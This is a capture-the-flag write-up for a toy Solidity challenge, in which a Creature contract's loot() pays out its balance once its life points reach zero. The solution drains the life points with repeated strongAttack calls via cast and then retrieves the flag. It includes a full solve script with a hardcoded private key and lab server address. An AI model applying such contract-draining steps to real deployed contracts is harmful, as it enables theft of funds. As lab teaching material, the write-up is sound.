# Survival of the fittest

We are provided with two Solidity contracts, `Setup.sol` and `Creature.sol`. The goal of this challenge is to interact with the Creature contract deployed by the Setup contract and drain its life points to trigger the `loot` function and obtain the flag.

## Contract Overview
### Setup.sol
`Setup.sol` is the main contract used to set up the challenge. It does the following:

1. Requires 1 Ether to be sent upon deployment.
2. Creates an instance of the `Creature` contract and stores it as `TARGET`.
3. Provides a `isSolved` function to check if the challenge is solved.

### Creature.sol
`Creature.sol` represents the creature with life points that you need to attack and eventually loot. It has the following functions:

* `strongAttack(uint256 _damage)`: Deals damage to the creature.
* `punch()`: Deals 1 damage to the creature.
* `loot()`: Allows you to loot the creature's balance when its life points reach 0.

## Solution

1. Find vulnerable function

When looking through the `loot()` function, we can see something fishy. 
```solidity
function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }
```
This will check if the `lifePoints` is equal to 0. If it is NOT equal, it returns that the `"Creature is still alive!"`. 

But when lifePoints are 0, it will transfer the entire balance of the current contract `(address(this))` to the `msg.sender`.

AKA, transfer us all of the money 😎

2. Now we need to find a way for us to make our `lifePoints` to 0.

This can be done with either the `punch()` function
```solidity
function punch() external {
        _dealDamage(1);
    }
```
or the `strongAttack(uint256 _damage)` function
```solidity
function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
``` 
where both of these will call the `dealDamage(uint256 _damage)` function where it will reduce the `lifePoints` to `-= _damage;`
```solidity
function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
```

2. Check Initial Life Points

I will use the cast call command to check the initial life points of my wallet. We should have 20.
```bash
cast call *targetadress* "lifePoints()" --rpc-url https://x.x.x.x/rpc
```

3. Attack!!

Then to leak the flag we will make a loop that will run 20 times with using the `strongAttack` function where we set the `_damage` to 1, until we have a lifepoint of 0.  
```bash
for ((i=0; i<20; i++)); do
    cast send *targetadress* "strongAttack(uint256)" 1 --rpc-url https://x.x.x.x/rpc --private-key *privatekey*
done
```

4. Loot the Creature

Once the creature's life points reach 0, we can use the loot function to obtain its balance.

```bash
cast send *targetadress* "loot()" --rpc-url https://x.x.x.x/rpc --private-key *privatekey*
```

5. Obtain the Flag
Either go to your web browser and go to the `/flag` endpoing or use `curl` to retrieve the flag.

```bash
curl -s "$url/flag"
```

And the solution I made is this script where we just pass in the url, privatekey and target address as a variable.
```bash
#!/bin/bash

target_adress=0x0cE6FDF176e76B287b1B22FcC24E0a4a4DdB3FE9
private_key=0xdbcef11a58213e62451d140c64ba3fb7a715570a4ea9772d7eeab2d075ddbf12

cast call $target_adress "lifePoints()" --rpc-url http://167.172.62.51:31520/rpc

for ((i=0; i<20; i++)); do
    cast send $target_adress "strongAttack(uint256)" 1 --rpc-url http://167.172.62.51:31520/rpc --private-key $private_key
    cast call $target_adress "lifePoints()" --rpc-url http://167.172.62.51:31520/rpc
done

cast send $target_adress "loot()" --rpc-url http://167.172.62.51:31520/rpc --private-key $private_key

curl -s "http://167.172.62.51:31520/flag"
echo 
```

But it could be narrowed down to these commands
```bash
cast call $target_adress "lifePoints()" --rpc-url http://167.172.62.51:31520/rpc
```
```bash
cast send $target_adress "strongAttack(uint256)" 1 --rpc-url http://167.172.62.51:31520/rpc --private-key $private_key
s
```
```bash
cast send $target_adress "loot()" --rpc-url http://167.172.62.51:31520/rpc --private-key $private_key
```
```bash
curl -s "http://167.172.62.51:31520/flag"
```